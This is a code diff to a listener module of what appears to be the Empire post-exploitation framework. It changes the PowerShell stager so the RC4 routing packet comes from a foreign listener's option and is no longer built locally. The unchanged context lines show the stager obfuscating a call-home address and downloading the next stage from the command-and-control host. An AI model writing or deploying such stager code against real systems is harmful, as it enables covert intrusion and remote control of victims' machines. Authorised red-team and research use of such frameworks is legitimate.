@@ -6,7 +6,7 @@ from builtins import object, str
 from textwrap import dedent
 from typing import List, Optional, Tuple
 
-from empire.server.common import helpers, packets, templating
+from empire.server.common import helpers, templating
 from empire.server.common.empire import MainMenu
 from empire.server.utils import data_util, listener_util
 
@@ -65,6 +65,11 @@ class Listener(object):
             "Cookie": {
                 "Description": "Custom Cookie Name",
                 "Required": False,
+                "Value": "",
+            },
+            "RoutingPacket": {
+                "Description": "Routing packet from the targeted listener",
+                "Required": True,
                 "Value": "",
             },
             "DefaultDelay": {
@@ -258,19 +263,11 @@ class Listener(object):
                 # this is the minimized RC4 stager code from rc4.ps1
                 stager += listener_util.powershell_rc4()
 
-                # prebuild the request routing packet for the launcher
-                routingPacket = packets.build_routing_packet(
-                    stagingKey,
-                    sessionID="00000000",
-                    language="POWERSHELL",
-                    meta="STAGE0",
-                    additional="None",
-                    encData="",
-                )
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                # Use routingpacket from foreign listener
+                b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
 
                 # add the RC4 packet to a cookie
-                stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket.decode("UTF-8") }");'
+                stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket }");'
 
                 stager += f"$ser= { helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
                 stager += "$data=$wc.DownloadData($ser+$t);"
@@ -324,16 +321,7 @@ class Listener(object):
                     """
                 )
 
-                # prebuild the request routing packet for the launcher
-                routingPacket = packets.build_routing_packet(
-                    stagingKey,
-                    sessionID="00000000",
-                    language="POWERSHELL",
-                    meta="STAGE0",
-                    additional="None",
-                    encData="",
-                )
-                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
+                b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
 
                 # add the RC4 packet to a cookie
                 launcherBase += (
